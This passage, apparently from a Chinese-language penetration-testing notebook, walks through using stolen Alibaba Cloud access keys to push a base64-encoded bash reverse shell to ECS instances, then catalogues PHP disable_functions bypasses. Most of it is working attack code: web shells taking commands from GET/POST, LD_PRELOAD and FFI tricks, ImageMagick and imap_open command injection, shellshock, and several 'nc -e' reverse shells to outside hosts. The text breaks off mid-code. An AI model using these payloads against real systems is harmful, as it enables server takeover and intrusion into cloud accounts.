https://xz.aliyun.com/t/8310\nhttps://api.aliyun.com/#/?product=Ecs\n搜索框搜索选择CreateCommand来创建一个命令\nCommandContent填命令的base64，Type填RunShellScript\n命令echo &quot;bash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1&quot;| base64\nbash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1\nYmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMCZndDsmMQ==\n</code></pre>\n<p><img data-src=\"841.png\" alt=\"\" /></p>\n<pre><code>填好以后点调试SDK\n会直接给你起一个Cloud shell\n</code></pre>\n<p><img data-src=\"842.png\" alt=\"\" /></p>\n<pre><code>并创建一个CreateCommand.py文件，使用vi编辑\n</code></pre>\n<p><img data-src=\"843.png\" alt=\"\" /></p>\n<pre><code>填accessKeyId,accessSecret保存执行，并记录Commandid\n</code></pre>\n<p><img data-src=\"844.png\" alt=\"\" /></p>\n<pre><code>再次在搜索框搜索InvokeCommand\n</code></pre>\n<p><img data-src=\"845.png\" alt=\"\" /></p>\n<pre><code>Commandid填上面请求的返回值，InstanceId填行云管家显示的实例ID\n</code></pre>\n<p><img data-src=\"846.png\" alt=\"\" /></p>\n<pre><code>填好了点调试sdk然后编辑文件把accessKeyId accessSecret填一下，执行\n</code></pre>\n<p><img data-src=\"847.png\" alt=\"\" /></p>\n<pre><code>然后看监听的服务器shell已经反弹成功\n</code></pre>\n<p><img data-src=\"848.png\" alt=\"\" /></p>\n<h2 id=\"-143\"><a class=\"anchor\" href=\"#-143\">#</a> </h2>\n<h2 id=\"linux绕过disable_function\"><a class=\"anchor\" href=\"#linux绕过disable_function\">#</a> Linux 绕过 disable_function</h2>\n<h2 id=\"-144\"><a class=\"anchor\" href=\"#-144\">#</a> </h2>\n<h3 id=\"ld_preload\"><a class=\"anchor\" href=\"#ld_preload\">#</a> LD_PRELOAD</h3>\n<pre><code>linux环境\nputenv()、mail()可用\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\nhttp://192.168.0.107/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so\noutpath是命令输出位置，sopath指定so文件路径。\n或\n替换php文件中的mail为error_log(&quot;a&quot;,1);\n</code></pre>\n<h2 id=\"-145\"><a class=\"anchor\" href=\"#-145\">#</a> </h2>\n<h3 id=\"php70-73-bypass\"><a class=\"anchor\" href=\"#php70-73-bypass\">#</a> php7.0-7.3 bypass</h3>\n<pre><code>直接bypass\nhttps://raw.githubusercontent.com/mm0r1/exploits/master/php7-gc-bypass/exploit.php\n</code></pre>\n<h2 id=\"-146\"><a class=\"anchor\" href=\"#-146\">#</a> </h2>\n<h3 id=\"windows系统组件com绕过\"><a class=\"anchor\" href=\"#windows系统组件com绕过\">#</a> windows 系统组件 com 绕过</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$command</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$wsh</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">COM</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'WScript.shell'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 生成一个 COM 对象　Shell.Application 也能</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$exec</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$wsh</span><span class=\"token operator\">-></span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmd /c\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 调用对象方法来执行命令</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$stdout</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$exec</span><span class=\"token operator\">-></span><span class=\"token function\">StdOut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$stroutput</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$stdout</span><span class=\"token operator\">-></span><span class=\"token function\">ReadAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$stroutput</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h2 id=\"-147\"><a class=\"anchor\" href=\"#-147\">#</a> </h2>\n<h3 id=\"cgi启动方式\"><a class=\"anchor\" href=\"#cgi启动方式\">#</a> CGI 启动方式</h3>\n<pre><code>phpinfo中搜索server api是cgi或者fastcgi\n如果是cgi模式:上传如下htaccess\nOptions ExecCGI\nAddHandler cgi-script .xx\nwindows平台\n#!C:/Windows/System32/cmd.exe /c start calc.exe\n1\nlinux平台\n#!/bin/bash\necho -ne &quot;Content-Type: text:html\\n\\n&quot;\nwhoami\n如果是fast_cgi，上传如下htaccess\nOptions +ExecCGI\nAddHandler fcgid-script .abc\nFcgidWrapper &quot;C:/Windows/System32/cmd.exe /c start cmd.exe&quot; .abc\n上传任意文件.abc\n相对路径\nAddHandler fcgid-script .html\nFcgidWrapper &quot;../../php/php7.3.4nts/php-cgi.exe&quot; .html\n\nAddHandler fcgid-script .xx\nFcgidWrapper &quot;../../../WWW/localhost/calc.exe&quot; .xx\n</code></pre>\n<h2 id=\"-148\"><a class=\"anchor\" href=\"#-148\">#</a> </h2>\n<h3 id=\"imagemagick组件绕过\"><a class=\"anchor\" href=\"#imagemagick组件绕过\">#</a> ImageMagick 组件绕过</h3>\n<pre><code>imageMagick 版本 v6.9.3-9 或 v7.0.1-0\n第一种\n</code></pre>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Disable Functions: \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'disable_functions'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$command</span> <span class=\"token operator\">=</span> <span class=\"token constant\">PHP_SAPI</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'cli'</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$argv</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$command</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$command</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$exploit</span> <span class=\"token operator\">=</span> <span class=\"token string heredoc-string\"><span class=\"token delimiter symbol\"><span class=\"token punctuation\">&lt;&lt;&lt;</span>EOF</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>push graphic-context</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>viewbox 0 0 640 480</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>fill 'url(https://example.com/image.jpg\"|<span class=\"token interpolation\"><span class=\"token variable\">$command</span></span>\")'    //核心</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>pop graphic-context</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter symbol\">EOF<span class=\"token punctuation\">;</span></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"KKKK.mvg\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$exploit</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$thumb</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Imagick</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$thumb</span><span class=\"token operator\">-></span><span class=\"token function\">readImage</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'KKKK.mvg'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$thumb</span><span class=\"token operator\">-></span><span class=\"token function\">writeImage</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'KKKK.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$thumb</span><span class=\"token operator\">-></span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$thumb</span><span class=\"token operator\">-></span><span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"KKKK.mvg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"KKKK.png\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code>第二种\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> cmd <span class=\"token operator\">=</span> <span class=\"token string\">\"nc -e /usr/bin/zsh 127.0.0.1 4444\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">fileno</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">unsetenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>编译\ngcc -shared -fPIC imag.c -o imag.so\n</code></pre>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'LD_PRELOAD=/var/www/html/imag.so'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$img</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Imagick</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/tmp/1.ps'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h2 id=\"-149\"><a class=\"anchor\" href=\"#-149\">#</a> </h2>\n<h3 id=\"常规函数绕过\"><a class=\"anchor\" href=\"#常规函数绕过\">#</a> 常规函数绕过</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'whoami'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>------------------------------------------------------</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'whoami'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>------------------------------------------------------</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'whoami'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>------------------------------------------------------</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"whoami\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>------------------------------------------------------</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$command</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$handle</span> <span class=\"token operator\">=</span> <span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$command</span> <span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$handle</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span>        <span class=\"token keyword\">echo</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$handle</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//fread($handle, 1024);</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">pclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$handle</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>-------------------------------------------------------</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$command</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ipconfig\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token variable\">$descriptorspec</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"pipe\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token variable\">$handle</span> <span class=\"token operator\">=</span> <span class=\"token function\">proc_open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$command</span> <span class=\"token punctuation\">,</span><span class=\"token variable\">$descriptorspec</span> <span class=\"token punctuation\">,</span> <span class=\"token variable\">$pipes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pipes</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span>        <span class=\"token keyword\">echo</span> <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pipes</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//fgets($pipes[1],1024);</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h2 id=\"-150\"><a class=\"anchor\" href=\"#-150\">#</a> </h2>\n<h3 id=\"pcntl_exec\"><a class=\"anchor\" href=\"#pcntl_exec\">#</a> pcntl_exec</h3>\n<pre><code>开启了pcntl 扩展，并且php 4&gt;=4.2.0 , php5，linux\n</code></pre>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'pcntl_exec'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">pcntl_exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bin/bash\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/tmp/test.sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'pcntl extension is not support!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code>test.sh\n#!/bin/bash\nnc -e /bin/bash 1.1.1.1 8888       #反弹shell\n</code></pre>\n<h2 id=\"-151\"><a class=\"anchor\" href=\"#-151\">#</a> </h2>\n<h3 id=\"imap_open函数\"><a class=\"anchor\" href=\"#imap_open函数\">#</a> imap_open 函数</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'imap_open'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no imap_open function!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$server</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"x -oProxyCommand=echo\\t\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\">/tmp/cmd_result\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"|base64\\t-d|sh&#125;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">imap_open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&#123;'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$server</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">':143/imap&#125;INBOX'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/tmp/cmd_result\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h2 id=\"-152\"><a class=\"anchor\" href=\"#-152\">#</a> </h2>\n<h3 id=\"php74-ffi绕过\"><a class=\"anchor\" href=\"#php74-ffi绕过\">#</a> php7.4 FFI 绕过</h3>\n<pre><code>php 7.4\nffi.enable=true\n</code></pre>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'nc -e /bin/bash ip 8888'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$ffi</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">FFI</span><span class=\"token operator\">::</span><span class=\"token function\">cdef</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token string double-quoted-string\">\"int system(char *command);\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string double-quoted-string\">\"libc.so.6\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$ffi</span><span class=\"token operator\">-></span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h2 id=\"-153\"><a class=\"anchor\" href=\"#-153\">#</a> </h2>\n<h3 id=\"shellshock\"><a class=\"anchor\" href=\"#shellshock\">#</a> shellshock</h3>\n<pre><code>存在CVE-2014-6271漏洞\nPHP 5.*，linux，putenv()、mail()可用\n</code></pre>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">shellshock</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$tmp</span> <span class=\"token operator\">=</span> <span class=\"token function\">tempnam</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"PHP_LOL=() &#123; x; &#125;; <span class=\"token interpolation\"><span class=\"token variable\">$cmd</span></span> ><span class=\"token interpolation\"><span class=\"token variable\">$tmp</span></span> 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span 